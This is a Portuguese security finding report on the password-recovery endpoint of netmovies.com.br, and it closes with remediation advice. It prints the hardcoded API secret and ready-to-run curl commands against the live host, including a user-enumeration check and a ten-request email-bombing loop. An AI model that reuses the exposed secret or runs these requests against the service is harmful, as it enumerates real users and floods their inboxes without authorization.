# F-021 Password Recovery - Email Enumeration + Plaintext Password Leak

Alvo: netmovies.com.br (API + Web)
Severidade: CRÍTICA
Timestamp: 2026-08-20

## Vetores de Exploração

### 1. User Enumeration via Forgotten Endpoint
**Endpoint:** POST /v1/android/Forgotten

**Request (email existente):**
```
POST /v1/android/Forgotten
Content-Type: application/json

{"EmailCPF":"contato@netmovies.com.br","AuthenticationTicket":"netmovies@netmovies:a1c2af@#$"}
```

**Response:**
```json
{"ForgottenResult":{"Message":"Em breve você receberá um email com a sua senha.","Result":0}}
```

**Request (email inexistente):**
```
POST /v1/android/Forgotten
Content-Type: application/json

{"EmailCPF":"inexistente@teste.com.br","AuthenticationTicket":"netmovies@netmovies:a1c2af@#$"}
```

**Response:**
```json
{"ForgottenResult":{"Message":"Email não encontrado.","Result":-1}}
```

**Diferença:** `Result:0` + "receberá um email" vs `Result:-1` + "Email não encontrado" → enumeração confirmada.

### 2. Plaintext Password Leak
A mensagem de sucesso diz **"Em breve você receberá um email com a sua senha."**

Isso indica que o sistema envia a senha ORIGINAL do usuário por email, ao invés de enviar um link seguro de reset. Isso implica que:
- Senhas são armazenadas em texto plano (ou criptografia reversível)
- Qualquer pessoa com acesso ao email da vítima pode capturar a senha
- Não há token de reset temporário

### 3. No Rate Limiting
**10 requests consecutivos** ao endpoint Forgotten com o mesmo email:
- Todos retornaram HTTP 200
- Todos retornaram `Result:0`
- **Nenhum bloqueio**

Isso permite:
- Email bombing (inundar inbox da vítima com emails de "recuperação")
- Password spraying automatizado
- Enumeração massiva de usuários

### 4. Campo `EmailCPF` Aceita CPF
O campo `EmailCPF` aceita tanto email quanto CPF como identificador. Isso amplia a superfície de ataque:
- CPFs podem ser obtidos de vazamentos de dados
- Permite recuperação de senha via CPF sem email

### 5. Secret Hardcoded Exposto
```
AuthenticationTicket: netmovies@netmovies:a1c2af@#$
```
O secret da API está hardcoded no bundle JavaScript do Next.js:
`/_next/static/chunks/pages/_app-*.js`

Isso permite que QUALQUER PESSOA chame o endpoint Forgotten sem autenticação adicional.

## Reprodução Completa

```bash
# 1. Verificar email existente
curl -s -X POST https://netmovies-service.ottvs.com.br/v1/android/Forgotten \
  -H "Content-Type: application/json" \
  -d '{"EmailCPF":"contato@netmovies.com.br","AuthenticationTicket":"netmovies@netmovies:a1c2af@#$"}'

# Response: {"ForgottenResult":{"Message":"Em breve você receberá um email com a sua senha.","Result":0}}

# 2. Verificar email inexistente
curl -s -X POST https://netmovies-service.ottvs.com.br/v1/android/Forgotten \
  -H "Content-Type: application/json" \
  -d '{"EmailCPF":"inexistente@teste.com.br","AuthenticationTicket":"netmovies@netmovies:a1c2af@#$"}'

# Response: {"ForgottenResult":{"Message":"Email não encontrado.","Result":-1}}

# 3. Email bombing (10 requests sem bloqueio)
for i in $(seq 1 10); do
  curl -s -X POST https://netmovies-service.ottvs.com.br/v1/android/Forgotten \
    -H "Content-Type: application/json" \
    -d '{"EmailCPF":"contato@netmovies.com.br","AuthenticationTicket":"netmovies@netmovies:a1c2af@#$"}'
done
```

## Impacto

1. **Account Takeover** (acesso a senha via email)
2. **User Enumeration** (descobrir usuários cadastrados)
3. **Email Bombing** (negação de serviço via email)
4. **Senhas em texto plano** (comprometimento geral da base)

## Recomendação

- Rate limiting por IP/email
- Enviar link de reset com token JWT temporário
- Não informar se email existe ou não
- Hashing de senhas (bcrypt/argon2)
- Mover secret para server-side
- MFA no recovery
